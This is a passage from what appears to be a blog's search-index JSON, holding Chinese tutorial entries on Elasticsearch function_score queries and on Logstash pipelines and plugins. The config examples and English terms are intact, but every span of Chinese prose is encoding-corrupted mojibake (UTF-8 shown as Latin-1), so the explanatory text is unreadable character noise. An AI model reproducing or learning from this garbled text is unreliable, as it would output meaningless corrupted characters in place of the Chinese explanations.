å¦‚æœå‚ä¸è®¡ç®—çš„å­—æ®µæœ‰å¤šä¸ªå€¼ï¼Œé»˜è®¤é€‰æ‹©æœ€é è¿‘ä¸­å¿ƒç‚¹çš„å€¼ï¼Œä¹Ÿå°±æ˜¯ç¦»ä¸­å¿ƒç‚¹çš„æœ€è¿‘è·ç¦»ï¼Œå¯ä»¥é€šè¿‡ multi_value_mode è®¾ç½®ï¼š min : æœ€è¿‘è·ç¦» max : æœ€è¿œè·ç¦» avg : å¹³å‡è·ç¦» sum : æ‰€æœ‰è·ç¦»ç´¯åŠ  ç¤ºä¾‹ï¼š GET /_search { \"query\": { \"function_score\": { \"query\": { \"match\": { \"properties\": \"å¤§é˜³å°\" } }, \"functions\": [ { \"gauss\": { \"price\": { \"origin\": \"0\", \"scale\": \"2000\" } } }, { \"gauss\": { \"location\": { \"origin\": \"30, 120\", \"scale\": \"2km\" } } } ], \"score_mode\": \"multiply\" } } } å‡è®¾è¿™æ˜¯æœç´¢å¤§é˜³å°çš„æˆ¿æºï¼Œä¸Šä¾‹è®¾ç½®äº† price ä»·æ ¼å­—æ®µçš„ä¸­å¿ƒç‚¹æ˜¯ 0 ï¼ŒèŒƒå›´ 2000 ä»¥å†…ï¼Œä»¥åŠ location åœ°ç†ä½ç½®å­—æ®µçš„ä¸­å¿ƒç‚¹æ˜¯ â€œ30, 120â€ ï¼Œæ–¹åœ† 2km ä¹‹å†…ï¼Œåœ¨è¿™ä¸ªèŒƒå›´ä¹‹å¤–çš„åŒ¹é…ç»“æœçš„ score åˆ†æ•°ä¼šè¿›è¡Œé«˜æ–¯è¡°å‡ï¼Œå³æ‰“åˆ†é™ä½ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:2:4","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"script_score script_score è‡ªå®šä¹‰è„šæœ¬æ‰“åˆ†ï¼Œå¦‚æœä¸Šé¢çš„æ‰“åˆ†å‡½æ•°éƒ½æ»¡è¶³ä¸äº†ä½ ï¼Œä½ è¿˜å¯ä»¥ç›´æ¥ç¼–å†™è„šæœ¬æ‰“åˆ†ã€‚ ç¤ºä¾‹ï¼š GET /_search { \"query\": { \"function_score\": { \"query\": { \"match\": { \"message\": \"elasticsearch\" } }, \"script_score\": { \"script\": { \"source\": \"Math.log(2 + doc['my-int'].value)\" } } } } } åœ¨è„šæœ¬ä¸­é€šè¿‡ doc['field'] çš„å½¢å¼å»å¼•ç”¨å­—æ®µï¼Œdoc['field'].value å°±æ˜¯ä½¿ç”¨å­—æ®µå€¼ã€‚ ä½ ä¹Ÿå¯ä»¥æŠŠé¢å¤–çš„å‚æ•°ä¸è„šæœ¬å†…å®¹åˆ†å¼€ï¼š GET /_search { \"query\": { \"function_score\": { \"query\": { \"match\": { \"message\": \"elasticsearch\" } }, \"script_score\": { \"script\": { \"params\": { \"a\": 5, \"b\": 1.2 }, \"source\": \"params.a / Math.pow(params.b, doc['my-int'].value)\" } } } } } ","date":"2020-11-02","objectID":"/es-function-score-query/:2:5","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"ç»“è¯­ é€šè¿‡äº†è§£ Elasticsearch çš„è‡ªå®šä¹‰æ‰“åˆ†ç›¸ä¿¡ä½ èƒ½æ›´å¥½çš„å®Œæˆç¬¦åˆä¸šåŠ¡çš„ç»¼åˆæ€§æœç´¢ã€‚ ","date":"2020-11-02","objectID":"/es-function-score-query/:3:0","tags":["Elasticsearch"],"title":"Elasticsearch è‡ªå®šä¹‰æ‰“åˆ† Function score query","uri":"/es-function-score-query/"},{"categories":["Elasticsearch"],"content":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","date":"2020-11-01","objectID":"/logstash/","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Logstash å…¥é—¨ ","date":"2020-11-01","objectID":"/logstash/:0:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Logstash æ˜¯ä»€ä¹ˆ Logstash å°±æ˜¯ä¸€ä¸ªå¼€æºçš„æ•°æ®æµå·¥å…·ï¼Œå®ƒä¼šåšä¸‰ä»¶äº‹ï¼š ä»æ•°æ®æºæ‹‰å–æ•°æ® å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ã€è½¬æ¢ç­‰å¤„ç† å°†å¤„ç†åçš„æ•°æ®å†™å…¥ç›®æ ‡åœ° ä¾‹å¦‚ï¼š ç›‘å¬æŸä¸ªç›®å½•ä¸‹çš„æ—¥å¿—æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶å†…å®¹ï¼Œå¤„ç†æ•°æ®ï¼Œå†™å…¥ influxdb ã€‚ ä» kafka ä¸­æ¶ˆè´¹æ¶ˆæ¯ï¼Œå¤„ç†æ•°æ®ï¼Œå†™å…¥ elasticsearch ã€‚ ","date":"2020-11-01","objectID":"/logstash/:1:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"ä¸ºä»€ä¹ˆè¦ç”¨ Logstash ï¼Ÿ æ–¹ä¾¿çœäº‹ã€‚ å‡è®¾ä½ éœ€è¦ä» kafka ä¸­æ¶ˆè´¹æ•°æ®ï¼Œç„¶åå†™å…¥ elasticsearch ï¼Œå¦‚æœè‡ªå·±ç¼–ç ï¼Œä½ å¾—å»å¯¹æ¥ kafka å’Œ elasticsearch çš„ API å§ï¼Œå¦‚æœä½ ç”¨ Logstash ï¼Œè¿™éƒ¨åˆ†å°±ä¸ç”¨è‡ªå·±å»å®ç°äº†ï¼Œå› ä¸º Logstash å·²ç»ä¸ºä½ å°è£…äº†å¯¹åº”çš„ plugin æ’ä»¶ï¼Œä½ åªéœ€è¦å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶å½¢å¦‚ï¼š input { kafka { # kafka consumer é…ç½® } } filter { # æ•°æ®å¤„ç†é…ç½® } output { elasticsearch { # elasticsearch è¾“å‡ºé…ç½® } } ç„¶åè¿è¡Œ logstash å°±å¯ä»¥äº†ã€‚ Logstash æä¾›äº†ä¸¤ç™¾å¤šä¸ªå°è£…å¥½çš„ plugin æ’ä»¶ï¼Œè¿™äº›æ’ä»¶è¢«åˆ†ä¸ºä¸‰ç±»ï¼š input plugin : ä»å“ªé‡Œæ‹‰å–æ•°æ® filter plugin : æ•°æ®å¦‚ä½•å¤„ç† output plugin : æ•°æ®å†™å…¥ä½•å¤„ ä½¿ç”¨ logstash ä½ åªè¦ç¼–å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œåœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‘é€‰ç»„åˆè¿™äº› plugin æ’ä»¶ï¼Œå°±å¯ä»¥è½»æ¾å®ç°æ•°æ®ä»è¾“å…¥æºåˆ°è¾“å‡ºæºçš„å®æ—¶æµåŠ¨ã€‚ ","date":"2020-11-01","objectID":"/logstash/:1:1","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"å®‰è£… logstash è¯·å‚æ•°ï¼šå®˜æ–¹æ–‡æ¡£ ","date":"2020-11-01","objectID":"/logstash/:2:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"ç¬¬ä¸€ä¸ªç¤ºä¾‹ å‡è®¾ä½ å·²ç»å®‰è£…å¥½äº† logstash ï¼Œå¹¶ä¸”å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„å·²ç»åŠ å…¥åˆ°äº† PATH ç¯å¢ƒå˜é‡ä¸­ã€‚ ä¸‹é¢å¼€å§‹æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¤ºä¾‹ï¼Œç¼–å†™ pipeline.conf æ–‡ä»¶ï¼Œå†…å®¹ä¸ºï¼š input { stdin { } } filter { } output { stdout { } } è¿™ä¸ªé…ç½®æ–‡ä»¶çš„å«ä¹‰æ˜¯ï¼š input è¾“å…¥ä¸º stdinï¼ˆæ ‡å‡†è¾“å…¥ï¼‰ filter ä¸ºç©ºï¼ˆä¹Ÿå°±æ˜¯ä¸è¿›è¡Œæ•°æ®çš„å¤„ç†ï¼‰ output è¾“å‡ºä¸º stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ æ‰§è¡Œå‘½ä»¤ï¼š logstash -f pipeline.conf ç­‰å¾… logstash å¯åŠ¨å®Œæ¯•ï¼Œè¾“å…¥ hello world ç„¶åå›è½¦, ä½ å°±ä¼šçœ‹åˆ°ä»¥ä¸‹è¾“å‡ºå†…å®¹: { \"message\" =\u003e \"hello world\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e 2020-11-01T08:25:10.987Z, \"host\" =\u003e \"local\" } æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å·²ç»å­˜åœ¨äº message å­—æ®µä¸­äº†ã€‚ å½“ä½ è¾“å…¥å…¶ä»–å†…å®¹åä¹Ÿä¼šçœ‹åˆ°ç±»ä¼¼çš„è¾“å‡ºã€‚ è‡³æ­¤ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªç¤ºä¾‹å·²ç»å®Œæˆï¼Œæ­£å¦‚é…ç½®æ–‡ä»¶ä¸­æ‰€å®šä¹‰çš„ï¼ŒLogstash ä» stdin æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œä¸å¯¹æºæ•°æ®åšä»»ä½•å¤„ç†ï¼Œç„¶åè¾“å‡ºåˆ° stdout æ ‡å‡†è¾“å‡ºã€‚ ","date":"2020-11-01","objectID":"/logstash/:3:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"ç‰¹å®šåè¯å’Œå­—æ®µ event : æ•°æ®åœ¨ logstash ä¸­è¢«åŒ…è£…æˆ event äº‹ä»¶çš„å½¢å¼ä» input åˆ° filter å†åˆ° output æµè½¬ã€‚ @timestamp : ç‰¹æ®Šå­—æ®µï¼Œæ ‡è®° event å‘ç”Ÿçš„æ—¶é—´ã€‚ @version : ç‰¹æ®Šå­—æ®µï¼Œæ ‡è®° event çš„ç‰ˆæœ¬å·ã€‚ message : æºæ•°æ®å†…å®¹ã€‚ @metadata : å…ƒæ•°æ®ï¼Œkey/value çš„å½¢å¼ï¼Œæ˜¯å¦æœ‰æ•°æ®å¾—çœ‹å…·ä½“æ’ä»¶ï¼Œä¾‹å¦‚ kafka çš„ input æ’ä»¶ä¼šåœ¨ @metadata é‡Œè®°å½• topicã€consumer_groupã€partitionã€offset ç­‰ä¸€äº›å…ƒæ•°æ®ã€‚ tags : è®°å½• tag çš„å­—ç¬¦ä¸²æ•°ç»„ã€‚ ","date":"2020-11-01","objectID":"/logstash/:3:1","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"å­—æ®µå¼•ç”¨ åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡ [field] çš„å½¢å¼å¼•ç”¨å­—æ®µå†…å®¹ï¼Œå¦‚æœåœ¨å­—ç¬¦ä¸²ä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡ %{[field]} çš„æ–¹å¼è¿›è¡Œå¼•ç”¨ã€‚ ç¤ºä¾‹ï¼š input { kafka { # kafka é…ç½® } } filter { # å¼•ç”¨ log_level å­—æ®µçš„å†…å®¹è¿›è¡Œåˆ¤æ–­ if [log_level] == \"debug\" { } } output { elasticsearch { # %{+yyyy.MM.dd} æ¥æºäº @timestamp index =\u003e \"log-%{+yyyy.MM.dd}\" document_type =\u003e \"_doc\" document_id =\u003e \"%{[@metadata][kafka][key]}\" hosts =\u003e [\"127.0.0.1:9200\"] } } ","date":"2020-11-01","objectID":"/logstash/:3:2","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Plugin æ’ä»¶ä¸€è§ˆ ç”¨å¥½ Logstash çš„ç¬¬ä¸€æ­¥å°±æ˜¯ç†Ÿæ‚‰ plugin æ’ä»¶ï¼Œåªæœ‰ç†Ÿæ‚‰äº†è¿™äº›æ’ä»¶ä½ æ‰èƒ½å¿«é€Ÿé«˜æ•ˆçš„å»ºç«‹æ•°æ®ç®¡é“ã€‚ ","date":"2020-11-01","objectID":"/logstash/:4:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Input plugin Input æ’ä»¶å®šä¹‰äº†æ•°æ®æºï¼Œå³ logstash ä»å“ªé‡Œæ‹‰å–æ•°æ®ã€‚ beats : ä» Elastic Beats æ¡†æ¶ä¸­æ¥æ”¶æ•°æ®ã€‚ ç¤ºä¾‹ï¼š input { beats { port =\u003e 5044 } } dead_letter_queue : ä» Logstash è‡ªå·±çš„ dead letter queue ä¸­æ‹‰å–æ•°æ®ï¼Œç›®å‰ dead letter queue åªæ”¯æŒè®°å½• output ä¸º elasticsearch æ—¶å†™å…¥ 400 æˆ– 404 çš„æ•°æ®ã€‚ ç¤ºä¾‹ï¼š input { dead_letter_queue { path =\u003e \"/var/logstash/data/dead_letter_queue\" start_timestamp =\u003e \"2017-04-04T23:40:37\" } } elasticsearch : ä» elasticsearch ä¸­è¯»å– search query çš„ç»“æœã€‚ ç¤ºä¾‹ï¼š input { elasticsearch { hosts =\u003e \"localhost\" query =\u003e '{ \"query\": { \"match\": { \"statuscode\": 200 } } }' } } exec : å®šæœŸæ‰§è¡Œä¸€ä¸ª shell å‘½ä»¤ï¼Œç„¶åæ•è·å…¶è¾“å‡ºã€‚ ç¤ºä¾‹ï¼š input { exec { command =\u003e \"ls\" interval =\u003e 30 } } file : ä»æ–‡ä»¶ä¸­æµå¼è¯»å–å†…å®¹ã€‚ ç¤ºä¾‹ï¼š input { file { path =\u003e [\"/var/log/*.log\", \"/var/log/message\"] start_position =\u003e \"beginning\" } } generator : ç”Ÿæˆéšæœºæ•°æ®ã€‚ ç¤ºä¾‹ï¼š input { generator { count =\u003e 3 lines =\u003e [ \"line 1\", \"line 2\", \"line 3\" ] } } github : ä» github webhooks ä¸­è¯»å–æ•°æ®ã€‚ graphite : æ¥å— graphite çš„ metrics æŒ‡æ ‡æ•°æ®ã€‚ heartbeat : ç”Ÿæˆå¿ƒè·³ä¿¡æ¯ã€‚è¿™æ ·åšçš„ä¸€èˆ¬ç›®çš„æ˜¯æµ‹è¯• Logstash çš„æ€§èƒ½å’Œå¯ç”¨æ€§ã€‚ http : Logstash æ¥å— http è¯·æ±‚ä½œä¸ºæ•°æ®ã€‚ http_poller : Logstash å‘èµ· http è¯·æ±‚ï¼Œè¯»å–å“åº”æ•°æ®ã€‚ ç¤ºä¾‹ï¼š input { http_poller { urls =\u003e { test1 =\u003e \"http://localhost:9200\" test2 =\u003e { method =\u003e get user =\u003e \"AzureDiamond\" password =\u003e \"hunter2\" url =\u003e \"http://localhost:9200/_cluster/health\" headers =\u003e { Accept =\u003e \"application/json\" } } } request_timeout =\u003e 60 schedule =\u003e { cron =\u003e \"* * * * * UTC\"} codec =\u003e \"json\" metadata_target =\u003e \"http_poller_metadata\" } } imap : ä» IMAP æœåŠ¡å™¨è¯»å–é‚®ä»¶ã€‚ jdbc : é€šè¿‡ JDBC æ¥å£å¯¼å…¥æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚ ç¤ºä¾‹ï¼š input { jdbc { jdbc_driver_library =\u003e \"mysql-connector-java-5.1.36-bin.jar\" jdbc_driver_class =\u003e \"com.mysql.jdbc.Driver\" jdbc_connection_string =\u003e \"jdbc:mysql://localhost:3306/mydb\" jdbc_user =\u003e \"mysql\" parameters =\u003e { \"favorite_artist\" =\u003e \"Beethoven\" } schedule =\u003e \"* * * * *\" statement =\u003e \"SELECT * from songs where artist = :favorite_artist\" } } kafka : æ¶ˆè´¹ kafka ä¸­çš„æ¶ˆæ¯ã€‚ ç¤ºä¾‹ï¼š input { kafka { bootstrap_servers =\u003e \"127.0.0.1:9092\" group_id =\u003e \"consumer_group\" topics =\u003e [\"kafka_topic\"] enable_auto_commit =\u003e true auto_commit_interval_ms =\u003e 5000 auto_offset_reset =\u003e \"latest\" decorate_events =\u003e true isolation_level =\u003e \"read_uncommitted\" max_poll_records =\u003e 1000 } } rabbitmq : ä» RabbitMQ é˜Ÿåˆ—ä¸­æ‹‰å–æ•°æ®ã€‚ redis : ä» redis ä¸­è¯»å–æ•°æ®ã€‚ stdin : ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚ syslog : è¯»å– syslog æ•°æ®ã€‚ tcp : é€šè¿‡ TCP socket è¯»å–æ•°æ®ã€‚ udp : é€šè¿‡ udp è¯»å–æ•°æ®ã€‚ unix : é€šè¿‡ UNIX socket è¯»å–æ•°æ®ã€‚ websocket : é€šè¿‡ websocket åè®® è¯»å–æ•°æ®ã€‚ ","date":"2020-11-01","objectID":"/logstash/:4:1","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Output plugin Output æ’ä»¶å®šä¹‰äº†æ•°æ®çš„è¾“å‡ºåœ°ï¼Œå³ logstash å°†æ•°æ®å†™å…¥ä½•å¤„ã€‚ csv : å°†æ•°æ®å†™å…¥ csv æ–‡ä»¶ã€‚ elasticsearch : å†™å…¥ Elasticsearch ã€‚ email : å‘é€ email é‚®ä»¶ã€‚ exec : æ‰§è¡Œå‘½ä»¤ã€‚ file : å†™å…¥ç£ç›˜æ–‡ä»¶ã€‚ graphite : å†™å…¥ Graphite ã€‚ http : å‘é€ http è¯·æ±‚ã€‚ influxdb : å†™å…¥ InfluxDB ã€‚ kafka : å†™å…¥ Kafka ã€‚ mongodb : å†™å…¥ MongoDB ã€‚ opentsdb : å†™å…¥ OpenTSDB ã€‚ rabbitmq : å†™å…¥ RabbitMQ ã€‚ redis : ä½¿ç”¨ RPUSH çš„æ–¹å¼å†™å…¥åˆ° Redis é˜Ÿåˆ—ã€‚ sink : å°†æ•°æ®ä¸¢å¼ƒï¼Œä¸å†™å…¥ä»»ä½•åœ°æ–¹ã€‚ syslog : å°†æ•°æ®å‘é€åˆ° syslog æœåŠ¡ç«¯ã€‚ tcp : å‘é€ TCP socketã€‚ udp : å‘é€ UDP ã€‚ webhdfs : é€šè¿‡ webhdfs REST API å†™å…¥ HDFS ã€‚ websocket : æ¨é€ websocket æ¶ˆæ¯ ã€‚ ","date":"2020-11-01","objectID":"/logstash/:4:2","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"Filter plugin Filter æ’ä»¶å®šä¹‰å¯¹æ•°æ®è¿›è¡Œå¦‚ä½•å¤„ç†ã€‚ aggregate : èšåˆæ•°æ®ã€‚ alter : ä¿®æ”¹æ•°æ®ã€‚ bytes : å°†å­˜å‚¨å¤§å°å¦‚ â€œ123 MBâ€ æˆ– â€œ5.6gbâ€ çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼è§£æä¸ºä»¥å­—èŠ‚ä¸ºå•ä½çš„æ•°å€¼ã€‚ cidr : æ£€æŸ¥ IP åœ°å€æ˜¯å¦åœ¨æŒ‡å®šèŒƒå›´å†…ã€‚ ç¤ºä¾‹ï¼š filter { cidr { add_tag =\u003e [ \"testnet\" ] address =\u003e [ \"%{src_ip}\", \"%{dst_ip}\" ] network =\u003e [ \"192.0.2.0/24\" ] } } cipher : å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†æˆ–è§£å¯†ã€‚ clone : å¤åˆ¶ event äº‹ä»¶ã€‚ csv : è§£æ CSV æ ¼å¼çš„æ•°æ®ã€‚ date : è§£æå­—æ®µä¸­çš„æ—¥æœŸæ•°æ®ã€‚ ç¤ºä¾‹ï¼ŒåŒ¹é…è¾“å…¥çš„ timestamp å­—æ®µï¼Œç„¶åæ›¿æ¢ @timestamp ï¼š filter { date { match =\u003e [\"timestamp\", \"dd/MMM/yyyy:HH:mm:ss ZZ\"] target =\u003e \"@timestamp\" } } dissect : ä½¿ç”¨ %{} çš„å½¢å¼æ‹†åˆ†å­—ç¬¦ä¸²å¹¶æå–å‡ºç‰¹å®šå†…å®¹ï¼Œæ¯”è¾ƒå¸¸ç”¨ï¼Œå…·ä½“è¯­æ³•è§ dissect æ–‡æ¡£ã€‚ drop : ä¸¢å¼ƒè¿™ä¸ª event ã€‚ ç¤ºä¾‹ï¼š filter { if [loglevel] == \"debug\" { drop { } } } elapsed : é€šè¿‡è®°å½•å¼€å§‹å’Œç»“æŸæ—¶é—´è·Ÿè¸ª event çš„è€—æ—¶ã€‚ elasticsearch : åœ¨ elasticsearch ä¸­è¿›è¡Œæœç´¢ï¼Œå¹¶å°†æ•°æ®å¤åˆ¶åˆ°å½“å‰ event ä¸­ã€‚ environment : å°†ç¯å¢ƒå˜é‡ä¸­çš„æ•°æ®å­˜å‚¨åˆ° @metadata å­—æ®µä¸­ã€‚ extractnumbers : æå–å­—ç¬¦ä¸²ä¸­æ‰¾åˆ°çš„æ‰€æœ‰æ•°å­—ã€‚ fingerprint : æ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªå­—æ®µçš„å†…å®¹åˆ›å»ºå“ˆå¸Œå€¼ï¼Œå¹¶å­˜å‚¨åˆ°æ–°çš„å­—æ®µä¸­ã€‚ geoip : ä½¿ç”¨ç»‘å®šçš„ GeoLite2 æ•°æ®åº“æ·»åŠ æœ‰å…³ IP åœ°å€çš„åœ°ç†ä½ç½®çš„ä¿¡æ¯ï¼Œè¿™ä¸ªæ’ä»¶éå¸¸æœ‰ç”¨ï¼Œä½ å¯ä»¥æ ¹æ® IP åœ°å€å¾—åˆ°å¯¹åº”çš„å›½å®¶ã€çœä»½ã€åŸå¸‚ã€ç»çº¬åº¦ç­‰åœ°ç†ä½ç½®æ•°æ®ã€‚ ç¤ºä¾‹ï¼Œé€šè¿‡ clent_ip å­—æ®µè·å–å¯¹åº”çš„åœ°ç†ä½ç½®ä¿¡æ¯ï¼š filter { geoip { cache_size =\u003e 1000 default_database_type =\u003e \"City\" source =\u003e \"clent_ip\" target =\u003e \"geo\" tag_on_failure =\u003e [\"_geoip_city_fail\"] add_field =\u003e { \"geo_country_name\" =\u003e \"%{[geo][country_name]}\" \"geo_region_name\" =\u003e \"%{[geo][region_name]}\" \"geo_city_name\" =\u003e \"%{[geo][city_name]}\" \"geo_location\" =\u003e \"%{[geo][latitude]},%{[geo][longitude]}\" } remove_field =\u003e [\"geo\"] } } grok : é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼å»å¤„ç†å­—ç¬¦ä¸²ï¼Œæ¯”è¾ƒå¸¸ç”¨ï¼Œå…·ä½“è¯­æ³•è§ grok æ–‡æ¡£ã€‚ http : ä¸å¤–éƒ¨ web services/REST APIs é›†æˆã€‚ i18n : ä»å­—æ®µä¸­åˆ é™¤ç‰¹æ®Šå­—ç¬¦ã€‚ java_uuid : ç”Ÿæˆ UUID ã€‚ jdbc_static : ä»è¿œç¨‹æ•°æ®åº“ä¸­è¯»å–æ•°æ®ï¼Œç„¶åä¸°å¯Œ event ã€‚ jdbc_streaming : æ‰§è¡Œ SQL æŸ¥è¯¢ç„¶åå°†ç»“æœå­˜å‚¨åˆ°æŒ‡å®šå­—æ®µã€‚ json : è§£æ json å­—ç¬¦ä¸²ï¼Œç”Ÿæˆ field å’Œ valueã€‚ ç¤ºä¾‹ï¼š filter { json { skip_on_invalid_json =\u003e true source =\u003e \"message\" } } å¦‚æœè¾“å…¥çš„ message å­—æ®µæ˜¯ json å­—ç¬¦ä¸²å¦‚ \"{\"a\": 1, \"b\": 2}\", é‚£ä¹ˆè§£æåå°±ä¼šå¢åŠ ä¸¤ä¸ªå­—æ®µï¼Œå­—æ®µååˆ†åˆ«æ˜¯ a å’Œ b ã€‚ kv : è§£æ key=value å½¢å¼çš„æ•°æ®ã€‚ memcached : ä¸å¤–éƒ¨ memcached é›†æˆã€‚ metrics : logstash åœ¨å†…å­˜ä¸­å»èšåˆæŒ‡æ ‡æ•°æ®ã€‚ mutate : å¯¹å­—æ®µè¿›è¡Œä¸€äº›å¸¸è§„æ›´æ”¹ã€‚ ç¤ºä¾‹ï¼š filter { mutate { split =\u003e [\"hostname\", \".\"] add_field =\u003e { \"shortHostname\" =\u003e \"%{hostname[0]}\" } } mutate { rename =\u003e [\"shortHostname\", \"hostname\"] } } prune : é€šè¿‡é»‘ç™½åå•çš„æ–¹å¼åˆ é™¤å¤šä½™çš„å­—æ®µã€‚ ç¤ºä¾‹ï¼š filter { prune { blacklist_names =\u003e [ \"method\", \"(referrer|status)\", \"${some}_field\" ] } } ruby : æ‰§è¡Œ ruby ä»£ç ã€‚ ç¤ºä¾‹ï¼Œè§£æ http://example.com/abc?q=haha å½¢å¼å­—ç¬¦ä¸²ä¸­çš„ query å‚æ•° q çš„å€¼ ï¼š filter { ruby { code =\u003e \" require 'cgi' req = event.get('request_uri').split('?') query = '' if req.length \u003e 1 query = req[1] qh = CGI::parse(query) event.set('search_q', qh['q'][0]) end \" } } åœ¨ ruby ä»£ç ä¸­ï¼Œå­—æ®µçš„è·å–å’Œè®¾ç½®é€šè¿‡ event.get() å’Œ event.set() æ–¹æ³•è¿›è¡Œæ“ä½œã€‚ sleep : ä¼‘çœ æŒ‡å®šæ—¶é—´ã€‚ split : æ‹†åˆ†å­—æ®µã€‚ throttle : é™æµï¼Œé™åˆ¶ event æ•°é‡ã€‚ translate : æ ¹æ®æŒ‡å®šçš„å­—å…¸æ–‡ä»¶å°†æ•°æ®è¿›è¡Œå¯¹åº”è½¬æ¢ã€‚ ç¤ºä¾‹ï¼š filter { translate { field =\u003e \"[http_status]\" destination =\u003e \"[http_status_description]\" dictionary =\u003e { \"100\" =\u003e \"Continue\" \"101\" =\u003e \"Switching Protocols\" \"200\" =\u003e \"OK\" \"500\" =\u003e \"Server Error\" } fallback =\u003e \"I'm a teapot\" } } truncate : å°†å­—æ®µå†…å®¹è¶…å‡ºé•¿åº¦çš„éƒ¨åˆ†è£å‰ªæ‰ã€‚ urldecode : å¯¹ urlencoded çš„å†…å®¹è¿›è¡Œè§£ç ã€‚ useragent : è§£æ user-agent çš„å†…å®¹å¾—åˆ°è¯¸å¦‚è®¾å¤‡ã€æ“ä½œç³»ç»Ÿã€ç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚ ç¤ºä¾‹ï¼š filter { # ua_device : è®¾å¤‡ # ua_name : æµè§ˆå™¨ # ua_os : æ“ä½œç³»ç»Ÿ useragent { lru_cache_size =\u003e 1000 source =\u003e \"user_agent\" target =\u003e \"ua\" add_field =\u003e { \"ua_device\" =\u003e \"%{[ua][device]}\" \"ua_name\" =\u003e \"%{[ua][name]}\" \"ua_os\" =\u003e \"%{[ua][os_name]}\" } remove_field =\u003e [\"ua\"] } } uuid : ç”Ÿæˆ UUID ã€‚ xml : è§£æ XML æ ¼å¼çš„æ•°æ®ã€‚ ","date":"2020-11-01","objectID":"/logstash/:4:3","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Elasticsearch"],"content":"ç»“è¯­ Logstash çš„æ’ä»¶é™¤äº†æœ¬æ–‡æåˆ°çš„è¿™äº›ä¹‹å¤–è¿˜æœ‰å¾ˆå¤šï¼Œæƒ³è¦è¯¦ç»†çš„äº†è§£æ¯ä¸ªæ’ä»¶å¦‚ä½•ä½¿ç”¨è¿˜æ˜¯è¦å»æŸ¥é˜…å®˜æ–¹æ–‡æ¡£ã€‚ å¾—ç›Šäº Logstash çš„æ’ä»¶ä½“ç³»ï¼Œä½ åªéœ€è¦ç¼–å†™ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå£°æ˜ä½¿ç”¨å“ªäº›æ’ä»¶ï¼Œå°±å¯ä»¥å¾ˆè½»æ¾çš„æ„å»ºæ•°æ®ç®¡é“ã€‚ ","date":"2020-11-01","objectID":"/logstash/:5:0","tags":["Elasticsearch"],"title":"æ•°æ®ç®¡é“ Logstash å…¥é—¨","uri":"/logstash/"},{"categories":["Engineering"],"content":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","date":"2020-06-04","objectID":"/image-search-total/","tags":["Engineering"],"title":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç†","uri":"/image-search-total/"},{"categories":["Engineering"],"content":"åˆæ‹å›¾ç‰‡ç®¡å®¶äº¿çº§å›¾åƒä¹‹æœå›¾ç³»ç»Ÿçš„ä¸¤ä»£æ¼”è¿›åŠåº•å±‚åŸç† 